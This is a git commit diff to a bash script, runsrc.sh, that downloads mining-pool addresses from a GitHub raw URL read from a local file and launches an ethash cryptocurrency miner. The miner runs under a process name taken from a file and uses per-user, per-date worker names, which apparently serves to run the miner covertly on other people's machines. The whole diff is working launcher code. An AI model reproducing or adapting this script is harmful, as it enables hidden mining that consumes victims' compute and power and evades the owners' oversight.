48da64924478d08fa34bb5591d2b41907d2d5dd8
Jame <lungtungner@gmail.com>
2022-03-19 14:45:08 +0700

    wpo

--- runsrc.sh
+++ runsrc.sh
@@ -1,14 +1,18 @@
 #!/bin/bash
 
-rm -rf pool1.txt pool2.txt
-gitpathbin=$(cat ../gitpath.txt)
-wget https://raw.githubusercontent.com/$gitpathbin/main/pool1.txt
-wget https://raw.githubusercontent.com/$gitpathbin/main/pool2.txt
-
+rm -rf wpo1.txt wpo2.txt
 Uuname=$(cat inuser.txt)
+
+cp ../gitpath.txt gitpath.txt
+
+gitpathbin=$(cat gitpath.txt)
+wget https://raw.githubusercontent.com/$gitpathbin/main/wpo1.txt
+wget https://raw.githubusercontent.com/$gitpathbin/main/wpo2.txt
+sleep 1
+
 date=$(cat date.txt)
 USEPROCNAME=$(cat SETPROCNAME.txt)
 namenday="$Uuname"-"$date"
-pool1=$(cat wpool1.txt)
-pool2=$(cat wpool2.txt)
+pool1=$(cat wpo1.txt)
+pool2=$(cat wpo2.txt)
 ./$USEPROCNAME -a ethash -o stratum+http://$pool1 -o stratum+http://$pool2 -w $namenday
